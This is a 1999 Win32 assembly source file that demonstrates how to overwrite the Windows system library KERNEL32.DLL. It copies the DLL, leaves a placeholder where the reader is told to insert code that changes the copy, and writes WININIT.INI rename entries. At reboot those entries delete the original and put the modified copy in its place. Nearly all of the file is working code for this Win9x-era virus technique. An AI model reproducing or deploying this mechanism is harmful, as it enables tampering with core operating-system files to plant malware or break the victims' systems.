; COPYKERN.ASM
;
; A demonstration of Kernel32.dll overwrite by Lord Julus (C) 1999
;
; Run the file and reboot. Replace the (*) area with your own code

.386p
.model flat, stdcall

extrn GetWindowsDirectoryA:proc
extrn GetSystemDirectoryA:proc
extrn lstrcat:proc
extrn WritePrivateProfileStringA:proc
extrn CopyFileA:proc
extrn GetLastError:proc
extrn ExitProcess: proc

.data

szWinInitFile db 260 dup (0)
wininit db "\\WININIT.INI",0
nul db "NUL",0
rename db "Rename", 0
szSystemKernel1 db 260 dup (0)
szSystemKernel2 db 260 dup (0)
kernel_old db "\KERNEL32.DLL", 0
kernel_new db "\KERNEL32.LLD", 0

.code

start:
       push 260                      ; get system directory
       push offset szSystemKernel1   ;
       call GetSystemDirectoryA      ;
                                     ;
       push 260                      ; again...
       push offset szSystemKernel2   ;
       call GetSystemDirectoryA      ;
                                     ;
       push offset kernel_old        ; concatenate "kernel32.dll"
       push offset szSystemKernel1   ;
       call lstrcat                  ;
                                     ;
       push offset kernel_new        ; concatenate "kernel32.lld"
       push offset szSystemKernel2   ;
       call lstrcat                  ;
                                     ;
       push 0                        ; copy the kernel32.dll onto
       push offset szSystemKernel2   ;          kernel32.lld
       push offset szSystemKernel1   ;
       call CopyFileA                ;

; (*) Replace this area with some code that openes the kernel32.lld file
; (*) and makes some notable changes in it...
; (*)
; (*)
; (*)
; (*)

       push 260                      ; get Windows directory
       push offset szWinInitFile     ;
       call GetWindowsDirectoryA     ;
                                     ;
       push offset wininit           ; concatenate wininit.ini filename
       push offset szWinInitFile     ;
       call lstrcat                  ;
                                     ;
       push offset szWinInitFile     ; write Profiles...
       push offset szSystemKernel1   ;
       push offset nul               ;
       push offset rename            ;
       call WritePrivateProfileStringA
                                     ;
       push offset szWinInitFile     ;
       push offset szSystemKernel2   ;
       push offset szSystemKernel1   ;
       push offset rename            ;
       call WritePrivateProfileStringA
                                     ;
       push 0                        ; close
       call ExitProcess              ;

; after reboot hex view kernel32.dll and see how it contains the notable
; changes you added
                                     ;
end start                            ;
end                                  ;
